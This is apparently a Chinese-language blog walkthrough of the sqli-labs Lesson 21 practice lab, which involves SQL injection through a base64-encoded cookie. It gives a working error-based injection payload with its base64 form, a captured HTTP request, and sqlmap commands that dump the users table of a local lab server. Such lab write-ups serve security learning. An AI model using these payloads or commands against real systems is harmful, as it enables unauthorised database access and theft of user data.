---
title: sqli-labs-lession 21 base64编码单引号和括号的Cookie注入
date: 2018-10-02 19:58:34
tags:
categories: sql注入
---

# sqli-labs-lession 21 base64编码单引号和括号的Cookie注入

---

## 登录界面

![1](/img/sql/Lesson-21/001.png)

## 注入过程

这一课从标题就可以发现其实和Lesson-20一样。以admin账户登入后发现本地的Cookie被加密了。

![2](/img/sql/Lesson-21/002.png)

加密方式是base64,通过burpsuite可以解密。

![3](/img/sql/Lesson-21/003.png)

所以伪造的恶意Cookie需要通过base64加密。这里故意加`'`

![4](/img/sql/Lesson-21/004.png)

刷新页面,用burpsuite抓包,修改Cookie。

![5](/img/sql/Lesson-21/005.png)

`admin')#`的base64编码为`YWRtaW4nKSM=`

![6](/img/sql/Lesson-21/006.png)

确认使用`')`闭合

payload:

`admin') and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#`

对应的base64编码

`YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKG51bGwsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9ICd1c2VycycpLDB4N2UpKSM=`

![7](/img/sql/Lesson-21/007.png)

## SQLMAP

这次是在Ubuntu下用的SQLMAP

先用Burpsuite像上一课一样抓包,修改如下

```
GET /sql/Less-21/index.php HTTP/1.1
Host: 192.168.75.131
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.75.131/sql/Less-21/index.php
Cookie: uname=YWRtaW4%3D*
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```



```
--dbms 指定后端数据库
--technique E 指定注入类型为报错注入
--threads 10 指定并发线程数
--level 2 指定检测等级,等级2包括Cookie
--tamper base64encode.py 指定脚本为对base64encode.py(它会对payload进行base64加密)
--flush-session 刷新session
--fresh-queries 建立新的查询
```

`python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py --flush-session --fresh-queries`

![8](/img/sql/Lesson-21/008.png)

获得payload:

![9](/img/sql/Lesson-21/009.png)

`python sqlmap.py -r ../post/post_21.txt --dbms mysql --technique E --threads 10 --level 2 --tamper base64encode.py -D security -T users --columns --dump`

![10](/img/sql/Lesson-21/010.png)


